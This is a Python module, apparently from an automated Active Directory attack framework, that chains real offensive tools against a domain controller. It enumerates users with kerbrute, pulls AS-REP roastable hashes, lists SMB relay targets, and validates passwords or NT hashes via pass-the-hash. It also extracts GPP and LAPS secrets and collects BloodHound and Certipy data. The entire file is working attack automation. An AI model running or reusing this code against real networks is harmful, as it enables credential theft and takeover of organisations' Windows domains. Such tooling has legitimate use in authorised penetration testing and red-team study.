from loguru import logger

from ..core.engine import register
from ..core.state import Cred


@register("enum")
class EnumPhase:
    """Authenticated + unauthenticated enumeration: nxc, kerbrute, BloodHound, Certipy."""

    def __init__(self, ctx):
        self.ctx = ctx

    def run(self):
        t = self.ctx.cfg.target
        f, st, ex = self.ctx.state.facts, self.ctx.state, self.ctx.ex
        wl = self.ctx.cfg.wordlists
        dc = t.dc_ip

        # seed credentials from config
        for c in self.ctx.cfg.credentials:
            st.add_cred(Cred(c["username"], c.get("password") or c.get("nthash"),
                             "password" if c.get("password") else "nthash", "config"))

        # unauthenticated user enumeration
        if wl.get("users"):
            r = ex.run(f"kerbrute userenum --dc {dc} -d {t.domain} {wl['users']} "
                       f"-o {ex.rawdir}/users_kerbrute.txt", name="kerbrute")
            if r.ok:
                f["userlist"] = f"{ex.rawdir}/users_kerbrute.txt"

        # unauthenticated AS-REP check
        if f.get("userlist"):
            r = ex.run(f"impacket-GetNPUsers '{t.domain}/' -usersfile {f['userlist']} "
                       f"-no-pass -dc-ip {dc} -format hashcat "
                       f"-outputfile {ex.rawdir}/asrep.hashes", name="asrep_noauth")
            f["asrep_hashes"] = f"{ex.rawdir}/asrep.hashes" if r.ok else None

        # SMB signing / relay candidates
        r = ex.run(f"nxc smb {t.range or dc} -u '' -p '' "
                   f"--gen-relay-list {ex.rawdir}/relay_targets.txt", name="smb_signing")
        if r.ok:
            f["no_signing_hosts"] = f"{ex.rawdir}/relay_targets.txt"

        cred = self._first_valid_cred()
        if not cred:
            logger.warning("no valid credentials yet — authenticated enum skipped")
            return

        auth = (f"-u '{cred.username}' -p '{cred.secret}'" if cred.secret_type == "password"
                else f"-u '{cred.username}' -H '{cred.secret}'")

        ex.run(f"nxc smb {dc} {auth} --pass-pol", name="passpol")
        ex.run(f"nxc smb {dc} {auth} --shares", name="shares")
        r = ex.run(f"nxc smb {t.range or dc} {auth} -M gpp_password -M gpp_autologin", name="gpp")
        if "GPP" in r.stdout:
            f["gpp_found"] = True
        r = ex.run(f"nxc smb {t.range or dc} {auth} -M laps", name="laps")
        if "LAPS" in r.stdout and "0 host" not in r.stdout:
            f["laps_readable"] = True

        r = ex.run(f"bloodhound-python -u '{cred.username}' -p '{cred.secret}' -d {t.domain} "
                   f"-dc {t.dc_hostname or dc} -c All --zip -o {ex.rawdir}/bh",
                   name="bloodhound", timeout=1800)
        if r.ok:
            f["bh_dir"] = f"{ex.rawdir}/bh"

        r = ex.run(f"certipy find -u '{cred.username}@{t.domain}' -p '{cred.secret}' "
                   f"-dc-ip {dc} -json -output {ex.rawdir}/certipy", name="certipy_find")
        f["certipy_json"] = f"{ex.rawdir}/certipy" if r.ok else None

    def _first_valid_cred(self):
        for c in self.ctx.state.creds:
            r = self.ctx.ex.run(
                f"nxc smb {self.ctx.cfg.target.dc_ip} -u '{c.username}' "
                f"{'-p' if c.secret_type == 'password' else '-H'} '{c.secret}'",
                name=f"validate_{c.username}")
            if "Pwn3d!" in r.stdout or "[+]" in r.stdout:
                c.validated = True
                return c
        return None
